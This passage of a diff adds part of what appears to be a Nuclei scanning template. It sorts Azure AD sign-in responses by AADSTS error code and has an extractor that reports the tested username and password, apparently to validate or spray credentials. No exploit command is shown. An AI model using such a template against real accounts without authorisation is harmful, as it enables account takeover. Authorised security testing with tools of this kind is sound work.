+          - 'contains(error_description, "AADSTS220450")'
+
+      - type: dsl
+        name: InvalidCrlDownload
+        dsl:
+          - 'contains(error_description, "AADSTS220501")'
+
+      - type: dsl
+        name: DeviceOnlyTokensNotSupportedByResource
+        dsl:
+          - 'contains(error_description, "AADSTS221000")'
+
+      - type: dsl
+        name: BulkAADJTokenUnauthorized
+        dsl:
+          - 'contains(error_description, "AADSTS240001")'
+
+      - type: dsl
+        name: RequiredClaimIsMissing
+        dsl:
+          - 'contains(error_description, "AADSTS240002")'
+
+      - type: dsl
+        name: ClaimsTransformationTimeoutRegularExpressionTimeout
+        dsl:
+          - 'contains(error_description, "AADSTS501621")'
+
+      - type: dsl
+        name: BlockedByConditionalAccessOnSecurityPolicy
+        dsl:
+          - 'contains(error_description, "AADSTS530032")'
+
+      - type: dsl
+        name: UnauthorizedClient_DoesNotMatchRequest
+        dsl:
+          - 'contains(error_description, "AADSTS700016")'
+
+      - type: dsl
+        name: InteractionRequired
+        dsl:
+          - 'contains(error_description, "AADSTS700020")'
+
+      - type: dsl
+        name: InvalidMultipleResourcesScope
+        dsl:
+          - 'contains(error_description, "AADSTS700022")'
+
+      - type: dsl
+        name: InvalidResourcelessScope
+        dsl:
+          - 'contains(error_description, "AADSTS700023")'
+
+      - type: dsl
+        name: InvalidClientSecretExpiredKeysProvided
+        dsl:
+          - 'contains(error_description, "AADSTS7000222")'
+
+      - type: dsl
+        name: ForbiddenTokenType
+        dsl:
+          - 'contains(error_description, "AADSTS700229")'
+
+      - type: dsl
+        name: InvalidGrantRedeemAgainstWrongTenant
+        dsl:
+          - 'contains(error_description, "AADSTS700005")'
+
+      - type: dsl
+        name: UserNotBoundError
+        dsl:
+          - 'contains(error_description, "AADSTS1000000")'
+
+      - type: dsl
+        name: BindCompleteInterruptError
+        dsl:
+          - 'contains(error_description, "AADSTS1000002")'
+
+      - type: dsl
+        name: UnauthorizedClientApplicationDisabled
+        dsl:
+          - 'contains(error_description, "AADSTS7000112")'
+
+      # Uncovered errors:
+      # AADSTS28002
+      # AADSTS28003
+      # AADSTS500021
+      # AADSTS500022
+      # AADSTS500133
+      # AADSTS500208
+      # AADSTS50029
+      # AADSTS50053
+      # AADSTS50056
+      # AADSTS50085
+      # AADSTS50088
+      # AADSTS50089
+      # AADSTS501241
+      # AADSTS50128
+      # AADSTS50143
+      # AADSTS501481
+      # AADSTS50194
+      # AADSTS53011
+      # AADSTS54005
+      # AADSTS65002
+      # AADSTS650052
+      # AADSTS650054
+      # AADSTS650056
+      # AADSTS650057
+      # AADSTS700027
+      # AADSTS700030
+      # AADSTS700054
+      # AADSTS700084
+      # AADSTS7500514
+      # AADSTS9001023
+      # AADSTS900144
+      # AADSTS90020
+      # AADSTS9002332
+      # AADSTS90027
+      # AADSTS900384
+      # AADSTS900432
+      # AADSTS900382
+      # AADSTS90099
+      # AADSTS900971
+      # AADSTS135011
+      # AADSTS165004
+      # AADSTS7000215
+      # AADSTS7000218
+      # AADSTS100007
+      # AADSTS1000031
+      # AADSTS7000114
+      # AADSTS7500529
+
+    extractors:
+      - type: json
+        part: body
+        name: error_description
+        json:
+          - '.error_description'
+        internal: true
+
+      - type: dsl
+        dsl:
+          - 'username'
+          - 'password'
